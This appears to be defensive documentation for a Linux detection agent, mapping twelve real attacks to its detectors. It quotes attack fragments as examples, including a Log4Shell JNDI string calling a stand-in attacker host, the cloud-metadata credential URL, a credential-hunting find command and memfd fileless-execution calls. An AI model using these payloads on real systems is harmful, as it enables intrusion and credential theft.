# How xhelix handles top real-world attacks

Concrete, scenario-driven walkthroughs of the attack classes xhelix is built for. Each section names a real-world incident or attack family, traces the attack stage-by-stage, says what standard EDRs miss, and shows the exact xhelix components that catch each stage.

Detection rules referenced are bundled in `ruleset/core/*.yaml` and `ruleset/correlator/*.yaml` and shipped in the deb.

---

## 1. XZ Utils backdoor (CVE-2024-3094, March 2024)

**Real incident.** A malicious maintainer slipped a backdoor into the `xz-utils` library. On affected distros, sshd was linked against the backdoored `liblzma`. The backdoor activated only when the running binary was sshd, was launched by systemd, and was matched by signature — making it nearly undetectable by signature-based scanners.

The payload allowed remote code execution via crafted SSH connection arguments.

**Attack flow:**

1. Backdoored `liblzma` ships in distro update
2. sshd is restarted (apt upgrade / reboot)
3. Attacker connects with crafted SSH probe; backdoor selects + executes
4. Process spawned by sshd runs attacker code
5. Attacker pivots — credential theft, lateral move, persistence

**Why signature EDR misses it:**
- The compromised library is signed by the distro
- IOC / hash blocklists have nothing on a brand-new supply-chain artifact
- The exec lineage looks like legitimate sshd → child process

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/source` | New `SystemdUnit` anchor minted on sshd restart |
| 3 | `pkg/brp/runtime.go` | sshd's signed BRP profile lists allowed children (root login shells, sftp-server, internal-sftp). The attacker's spawned process is **not** in `AllowedChildren`. |
| 3 | rule | `brp.hard_deny` Class 1 |
| 4 | `pkg/correlator` | Child process trying to read `~/.ssh/authorized_keys`, `/etc/shadow`, AWS creds → secret-taint state machine flips `clean → secret_touched` |
| 5 | `pkg/egressguard` | sshd-spawned process trying to egress to attacker's C2 → 6-path decision returns `EgressDeny` (protected role + raw IP / non-declared peer) |

**Verdict:** xhelix catches this at stage 3 — `brp.hard_deny` Class 1 fires the moment sshd spawns an unexpected child. The backdoor's signature trick (validate the running binary is sshd) is the exact same mechanism xhelix uses for role identification, but xhelix flips the polarity: instead of "I am sshd, activate," xhelix asks "is this child in sshd's signed allowed-list?"

---

## 2. SolarWinds Orion / Sunburst (December 2020)

**Real incident.** Compromised SolarWinds Orion software update injected a backdoor into thousands of corporate networks. The malicious DLL was signed with a valid SolarWinds certificate.

**Attack flow on a Linux build/CI host:**

1. SolarWinds update mechanism downloads + installs malicious package
2. Backdoored binary launched as a system service
3. After dormant period (12+ days), backdoor activates and connects to attacker DNS
4. Attacker uses backdoor for reconnaissance + lateral move
5. Specific high-value targets get second-stage tools deployed

**Why signature EDR misses it:**
- Binary is signed by legitimate vendor
- Update mechanism is allowlisted
- 12-day dormancy defeats short-window behavioral baselines
- DNS C2 looks like legitimate vendor telemetry

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 1 | `pkg/pkgmgr` (Phase K.2 planned) | Package install window tagged; legitimate update path |
| 2 | `pkg/imagecache` | SHA-256 fingerprint stored at first run; future binary swap = drift |
| 3 | `pkg/beacon` | Periodic callback detection — even slow beacons get caught by Phase H.2 long-window correlation (5-7d planned) |
| 3 | `pkg/dnsexfil` | DNS C2 with high label entropy → `dns_exfil.detected` |
| 4 | `pkg/secrettaint` | Backdoor reads `~/.aws/credentials`, kube tokens → state flips |
| 4 | `pkg/correlator` | Reconnaissance commands (find, grep, lsof, ss) by a service that doesn't normally run them = chain anomaly |
| 5 | `pkg/egressguard` | Second-stage tool egress → undeclared peer → `EgressVerify` then `EgressDeny` |

**Verdict:** stages 1-2 are invisible by design (legitimate update path). xhelix is strong on stages 3-5. Phase H.2 long-window correlation (in the locked roadmap) is what closes the 12-day dormancy gap fully.

---

## 3. 3CX desktop app supply-chain (March 2023)

**Real incident.** 3CX's VoIP desktop app was trojanized via a compromised upstream library. The malicious code activated on specific hosts and connected to attacker C2.

**Why signature EDR misses it:** signed vendor binary, expected update channel, normal-looking C2 hostnames.

**How xhelix catches it on a Linux server running the 3CX-equivalent service:**

| Stage | Component | What fires |
|---|---|---|
| Activation | `pkg/brp/runtime.go` | The service's signed BRP profile lists declared outbound peers. Attacker C2 is not in `DeclaredPeers` / `UpstreamHosts`. |
| Outbound | `pkg/egressguard` | Profiled role + undeclared destination → `EgressVerify`. Verifier's `NetworkNovelty` domain weights the first-seen destination. |
| Outbound | `pkg/snicheck` | If outbound is to a raw IP with no SNI, that alone is a Class 3 signal. |
| Payload exec | `pkg/brp/runtime.go` | Tmpfs exec by profiled role → L0 invariant `brp.hard_deny` Class 1 |

**Verdict:** xhelix doesn't try to detect the trojanized library. It detects that the trojanized library does things that **xhelix's signed contract for that role does not permit**. Same defense applies to any future supply-chain compromise of a signed vendor binary.

---

## 4. Log4Shell exploitation chain (CVE-2021-44228, Dec 2021)

**Real incident.** Java applications using Log4j 2.x were exploitable via crafted JNDI lookups in any logged user input. Attackers caused vulnerable apps to fetch + execute arbitrary code.

**Attack flow on a Linux app server:**

1. Attacker sends HTTP request with `${jndi:ldap://attacker/Exploit}` in a logged field
2. Vulnerable Java app makes outbound LDAP/DNS request to attacker
3. App fetches and deserializes attacker-controlled class
4. JVM executes attacker payload — typically spawns a shell or drops a binary
5. Attacker establishes persistence + exfil

**Why signature EDR misses it:**
- The exploit string is just data in a log
- Java is allowlisted to run
- Outbound LDAP looks like normal directory traffic
- Spawned shell is from a trusted parent (the JVM)

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/egressguard` | The Java service's BRP profile declares legitimate outbound peers (database, internal API). Attacker LDAP/DNS = undeclared → `EgressVerify` → `EgressDeny` in enforce mode. |
| 4 | `pkg/brp/runtime.go` | JVM spawning `/bin/sh` is not in the Java service's `AllowedChildren` → `brp.hard_deny` Class 1 |
| 4 | rule | `shell_with_socket_fd` if the shell inherits the JVM's open socket |
| 5 | `pkg/correlator` | `dropped_binary_lifecycle` chain: outbound (step 0) → exec from /tmp (step 1) |
| 5 | `pkg/secrettaint` | Spawned process reads `/etc/passwd` or env secrets → state flips |
| 5 | `pkg/incidentgraph` | All of the above correlate under one source anchor with `intent=c2` and MITRE `T1059.004` + `T1071` |

**Verdict:** Log4Shell is **textbook for xhelix**. Multiple Class 1 + Class 2 alerts fire on a single exploitation. The signed BRP profile turns "JVM spawning shell" from a soft anomaly into a hard contract violation.

---

## 5. MOVEit zero-day mass exploit (CL0P, May-June 2023)

**Real incident.** CL0P ransomware group exploited a zero-day SQL injection in MOVEit Transfer to mass-deploy a webshell, dump customer data, and exfiltrate.

**Attack flow:**

1. SQLi against MOVEit's web frontend
2. Drop `human2.aspx` (or equivalent) webshell
3. Webshell runs OS commands via the web app's process
4. Enumerate + dump the MOVEit database
5. Exfiltrate to attacker-controlled S3 / SFTP

**Why signature EDR misses it:**
- Zero-day — no signature
- Webshell file looks like a legitimate app file by extension
- Database read is the web app's normal job
- Exfil destination might be a major cloud provider (S3) that's broadly allowlisted

**How xhelix catches it (assume Linux equivalent of MOVEit):**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/fim` | File write to webroot path that's not in BRP profile's `FileWrites` allowlist → `fim.drift` |
| 2 | `pkg/assetclass` | Webroot path tagged `AssetWebDocRoot` → write is high-asset |
| 3 | `pkg/brp/runtime.go` | Web app spawning OS shell → `brp.hard_deny` Class 1 (web role's `AllowedChildren` doesn't include shells) |
| 3 | rule | `web_spawns_shell` + `shell_with_socket_fd` |
| 4 | `pkg/secrettaint` | Database read by spawned shell → secret-taint flips |
| 5 | `pkg/egressguard` | Outbound to attacker S3 / SFTP → undeclared peer for the web role → `EgressDeny` |
| 5 | `pkg/correlator` | `dropped_binary_lifecycle` + bulk file read pattern → incident with `intent=theft` |

**Verdict:** even without the zero-day signature, the **post-exploitation behaviors** all violate the web role's signed contract. xhelix doesn't need to know about MOVEit specifically — it needs to know what the web role is allowed to do, and refuses anything else.

---

## 6. Capital One AWS metadata SSRF (2019)

**Real incident.** Misconfigured WAF allowed SSRF against AWS Instance Metadata Service (IMDS). Attacker retrieved IAM role credentials from `169.254.169.254`, then used those credentials to download 100M+ customer records from S3.

**Attack flow:**

1. SSRF in WAF/proxy
2. WAF/proxy process fetches `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. Attacker extracts temporary AWS access key + secret + session token
4. Attacker uses creds to call S3 list/get APIs from external IP
5. Mass data download

**Why signature EDR misses it:**
- IMDS request is just an HTTP call
- AWS API calls from the attacker side happen off-host
- The compromised process is legitimate and signed

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2 | rule | `metadata.access_by_unexpected` Class 1 hard invariant — the WAF/proxy is not a cloud-aware role, so IMDS access fires hard_deny |
| 2 | rule | `metadata_svc_unexpected` Class 3 backup detector |
| 2 | `pkg/secrettaint` | The IMDS read transitions the lineage to `secret_touched` with `SecretCloudCreds` class |
| 3 | `pkg/secrettaint` | If the same lineage later writes the creds to disk or exfils, state escalates to `outbound_restricted` |
| 3 | `pkg/egressguard` | The metadata IP exclusion fix (2026-05-26 audit) ensures `169.254.169.254` is **not** treated as benign loopback/private — it's the most sensitive endpoint on the host |

**Verdict:** Class 1 `brp.hard_deny`-equivalent fires the moment the WAF hits IMDS. The Capital One incident is one of the canonical examples xhelix is built to prevent. The metadata-IP-as-private-bypass was specifically fixed during Phase C.3 soak.

---

## 7. Cortex-c2 implant family (open-source modern C2)

**Real public project.** Polling Python implant; uses TCP for C2 transport, an SSH brute-force plugin, plugin-on-demand fetch-and-exec, and a Telegram fallback channel. Designed to be operationally noisy.

**Attack flow:**

1. Implant agent (`main.py`) launched as long-lived Python process
2. 20-second poll to TCP database for tasking
3. Attacker tasks a command — Python passes it to a C wrapper, which `popen()`s it
4. Plugin staging: HTTP fetch → write → chmod +x → exec from `on_demand_plugins/`
5. Persistence: write `startup.sh` + nohup to detach
6. Lateral SSH brute-force plugin (`lateral_movement/main.go`)
7. Telegram fallback C2

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 1 | `pkg/brp` | The host's role profile (e.g. nginx-rp, mysql, app-server) doesn't list long-lived Python with TCP polling as a child. |
| 2 | `pkg/beacon` | 20-second polling cadence with small fixed payloads → `beacon.detected` |
| 3 | `pkg/brp/runtime.go` | Python → C wrapper → shell exec chain. Python is not in the host role's `AllowedChildren` (unless explicitly allowed). |
| 4 | `pkg/correlator` | **`dropped_binary_lifecycle`** chain (Phase J.2) fires on net_connect → exec from plugin dir |
| 5 | `pkg/fim` + `pkg/persistencewatch` | `startup.sh` write to persistence path → `fim.drift` + `persistence_chain` |
| 6 | `pkg/sshbrute` | Sliding-window counter on outbound SSH failures from this host as the attacker → `ssh_bruteforce` Class 2 |
| 7 | `pkg/egressguard` | Telegram API endpoint is in `AssetMessagingPlatform` (Phase J.3 — planned). Profiled server roles default-deny this class. |
| All | `pkg/incidentgraph` | Single incident accretes all alerts under one source anchor with `intent=c2`, MITRE `[T1071, T1059.004, T1105, T1098]` |

**Verdict:** cortex-c2 is operationally noisy and xhelix catches it at 6+ independent stages. We ran the analysis end-to-end and Phase J.2 (`dropped_binary_lifecycle`) was added specifically to make this kill chain one named correlator alert.

---

## 8. TeamTNT / Megalodon cryptominer dropper

**Real attack families.** Container-targeted cryptominer droppers that scan hosts, dump creds, deploy XMRig, and persist.

**Attack flow:**

1. Initial access — exposed Docker socket / weak SSH / Kubernetes misconfig
2. Reconnaissance — `find / -name "credentials"`, grep for AWS keys, SSH keys, kube tokens
3. Drop XMRig binary or use memfd-execve to run from memory
4. Reach out to mining pool
5. Drop systemd timer or cron for persistence
6. Scan internal subnets, spread

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/burstdet` | `file_read_burst` — hundreds of file_open events in seconds by one PID → Class 2 |
| 2 | `pkg/secrettaint` | Reading `~/.aws/credentials`, kube tokens → multi-class taint accumulation |
| 3 | rule | `memfd_run_pattern` Class 3 (or `binary_runs_from_tmp` if disk-based) |
| 3 | rule | `mem_mprotect_rwx` if XMRig mprotects pages RWX |
| 4 | `pkg/egressguard` | Mining pool address is undeclared → `EgressDeny` |
| 4 | `pkg/dnsexfil` / `pkg/beacon` | Mining stratum protocol has very predictable cadence |
| 5 | `pkg/fim` | Systemd timer / cron writes → `cron_new_unit` + `fim.drift` |
| 6 | `pkg/sshbrute` (Phase J.1) | Internal SSH brute attempts as the attacker spreads |

**Verdict:** the credential-scan burst at stage 2 is what xhelix's `file_read_burst` detector was built for — Megalodon-class scanning of hundreds of secret paths is a clean Class 2 signal long before any actual exfil.

---

## 9. SSH brute-force + key implantation (Mirai-style)

**Common attack pattern.** Mass scanning of public SSH ports, brute-force against weak credentials, persist via `authorized_keys` injection.

**Attack flow:**

1. Attacker scans public IPv4 for port 22
2. Brute-forces credentials on weak accounts
3. Logs in with stolen creds
4. Appends attacker pubkey to `~/.ssh/authorized_keys`
5. Downloads + runs second-stage payload (Mirai bot, miner, etc.)

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/sshbrute` (Phase J.1) | N failed auths from same source IP in M-second window → `ssh_bruteforce` Class 2 with users + counts |
| 3 | `pkg/source` | New `SSHAccept` source anchor minted for the successful login |
| 4 | `pkg/fim` | Write to `/root/.ssh/authorized_keys` → `ssh_key_added_root` Class 3 (canonical persistence detector) |
| 4 | `pkg/assetclass` | The path tagged `AssetSSHKey` → verifier weights heavily |
| 5 | `pkg/correlator` | `dropped_binary_lifecycle` chain on fetch + exec |

**Verdict:** stage 2 is now caught by Phase J.1 (shipped). Stage 4 has always been caught by `ssh_key_added_root`. Phase J.1 specifically closes the "we saw the auth fail but couldn't accumulate" gap.

---

## 10. Container escape via privileged mount (CVE-2019-5736 class)

**Real attack class.** Container running with `CAP_SYS_ADMIN` or `--privileged` mounts the host filesystem, then modifies host-side files (e.g., systemd units) to gain code execution on the host.

**Attack flow:**

1. Attacker compromises an app inside a container
2. Container has unsafe capabilities (CAP_SYS_ADMIN, CAP_DAC_READ_SEARCH, or `--privileged`)
3. Attacker mounts host root or `/proc/self/exe` overwrite
4. Writes a malicious systemd unit OR replaces a host binary
5. Wait for systemd to launch the unit → code runs on host

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/capwatch` | `cap.gained` Class 3 when capabilities are observed |
| 3 | `pkg/contescape` | `contescape.detected` — mount of host fs from inside a container, or pivot_root abuse |
| 3 | rule | `container_escape_privileged` from `ruleset/core/advanced.yaml` |
| 4 | `pkg/fim` | Write to `/etc/systemd/system/*.service` from a container-class cgroup → high-asset write |
| 4 | `pkg/persistencewatch` | Categorises the write as systemd persistence |
| 5 | `pkg/source` | New `SystemdUnit` anchor for the (malicious) unit start |

**Verdict:** stage 3 is the canonical Class 1/2 signal. xhelix combines the capset observation + cgroup classification + mount/pivot_root signal in one named rule. Phase G.3 landlock (planned, 2d) adds defense-in-depth at stage 4 by restricting which paths the daemon's own response engine can write to.

---

## 11. Memory implant / fileless malware (BPF or memfd-execve)

**Modern attack pattern.** Implant never touches disk. Uses `memfd_create` to allocate an anonymous executable, writes the payload into it, `execveat()`'s it. Or uses BPF programs as the implant body.

**Attack flow:**

1. Initial compromise (web RCE, SSH brute, supply chain — any of the above)
2. Allocate memfd: `int fd = memfd_create("payload", MFD_CLOEXEC)`
3. Write payload bytes to fd
4. `execveat(fd, "", argv, envp, AT_EMPTY_PATH)` — payload runs from memory
5. Payload also loads BPF programs to hide its presence and tamper with eBPF observers

**Why signature EDR misses it:**
- No file on disk to scan
- No path to look up
- Process exists but its `path` in /proc/PID/exe points to `/memfd:...`

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 2-3 | `pkg/ebpf` | `memfd_create` syscall observed; `from_memfd=true` tag |
| 4 | rule | `memfd_run_pattern` Class 3 — exec of a /memfd:* path |
| 4 | rule | `mem_mprotect_rwx` if the payload mprotects pages RWX |
| 5 | rule | `bpf_syscall_unexpected` Class 3 if the implant loads BPF programs from a context that's not allowed |
| 5 | `pkg/tamperguard` | Attempts to disable xhelix's BPF programs → `tamper_*` Class 1 |

**Verdict:** fileless implants are one of xhelix's strongest cases. The eBPF-instrumented `execveat` + `from_memfd` tag means there's no place for fileless to hide. Combined with `mem_mprotect_rwx` and `bpf_syscall_unexpected`, the implant trips multiple detectors before it can do useful work.

---

## 12. PAM module replacement (sudo backdoor)

**Real attack pattern.** Attacker with root replaces a PAM module (`pam_unix.so`, `pam_systemd.so`) with a trojanized version that logs passwords or accepts a magic password. Used by sophisticated post-exploit toolkits.

**Attack flow:**

1. Initial root access (chain from any of the above)
2. Backup legitimate PAM module
3. Drop trojanized PAM module to `/lib/x86_64-linux-gnu/security/`
4. On next login, every sudo password gets logged or magic password works

**How xhelix catches it:**

| Stage | Component | What fires |
|---|---|---|
| 3 | `pkg/fim` | Write to `/lib/x86_64-linux-gnu/security/*.so` → `fim.drift` Class 3 |
| 3 | `pkg/assetclass` | Path tagged as system library; verifier weights heavily |
| 3 | rule | `pam_module_modified` Class 3 (specific detector) |
| 3 | `pkg/brp` | The writing process is not the package manager → no `pkg_install_window` tag → no FP suppression |
| 4 | `pkg/identity` | Next sudo invocation by an unusual user from an unusual source → identity event correlates with the PAM modification window |

**Verdict:** the modification itself is detected at stage 3. Even if the attacker is root, the write is signed-by-no-one and not inside a package install transaction. xhelix doesn't try to prevent root-with-creds from writing files — it makes sure those writes are visible, anchored, and chain-attributed.

---

## Threat coverage matrix

Concise summary across the 12 scenarios above:

| Scenario | Stage caught | xhelix Class | Notes |
|---|---|---|---|
| XZ Utils backdoor | unauthorized child of sshd | Class 1 (`brp.hard_deny`) | Signed contract wins where signatures fail |
| SolarWinds Sunburst | C2 + recon + exfil | Class 1-2 | 12-day dormancy gap closed by Phase H.2 |
| 3CX desktop trojan | undeclared outbound peer | Class 1-2 | Same defense as supply-chain class |
| Log4Shell | JVM spawning shell | Class 1 | Textbook xhelix win |
| MOVEit zero-day | web role spawning shell + bulk DB read + undeclared exfil | Class 1-2 | Post-exploit chain detected without signature |
| Capital One IMDS SSRF | metadata access by non-cloud-role | Class 1 (`metadata.access_by_unexpected`) | One of the rules xhelix was built for |
| Cortex-c2 implant | 6+ independent stages | Class 1-3 | Specific chain rule (`dropped_binary_lifecycle`) for this class |
| TeamTNT cryptominer | credential burst + miner exec + persist | Class 2-3 | `file_read_burst` is built for this |
| SSH brute + key implant | N failures / window + authorized_keys write | Class 2-3 | Phase J.1 + canonical FIM detector |
| Container escape | privileged mount / pivot_root | Class 1-2 | `contescape.detected` + `cap.gained` |
| Memory implant (memfd) | execveat from memfd + RWX mprotect | Class 3 (multi-detector) | Strongest case for xhelix vs fileless |
| PAM module replacement | unauthorized write to security lib | Class 3 + verifier escalate | Anchored + chain-attributed |

---

## What xhelix does not catch (honest gaps)

Stated up front so the protection model is credible:

- **Pre-OS / firmware / hypervisor compromise** — xhelix is a Linux host agent. If the kernel is malicious before xhelix loads, we lose.
- **Kernel zero-day that disables BPF before xhelix starts** — observable post-fact (xhelix's BPF programs fail to load) but not preventable.
- **Insider with root + the BRP signing key** — separation-of-duties is operator policy, not enforced by xhelix v1.
- **Time-shifted attacks across days/weeks** — Phase H.2 long-window correlation (planned, 5-7d) closes this; today's correlator is short-window only.
- **CDN-cloaked C2 sharing a TLS SAN with legitimate traffic** — Phase H.4 planned (3-5d).
- **Workstation browser/cookie/session containment** — different product class; xhelix is server-side.

These gaps are explicit in `docs/BRP_IMPLEMENTATION_PLAN_2026-05-24.md` with budgets, merge gates, and risk register. **No marketing promise xhelix does not back with code.**

---

## How to verify these scenarios on your own host

```bash
# Run the bundled realistic credential-harvester corpus
sudo bash tests/attack-sim/run-all.sh

# Check what fired
xhelixctl rules fp
xhelixctl rules soak
xhelixctl incidents list
xhelixctl incidents show <id>

# Trace any alert back to ground truth
xhelixctl source lineage <anchor_id>

# Verify the forensic chain offline (independent auditor)
xhelix-verify --chain /var/lib/xhelix/chain --pub /etc/xhelix/chain.pub
```

The corpus exercises 12 real malware behavior stages and triggers the rules described above. Every alert is line-by-line auditable — no black-box scoring.
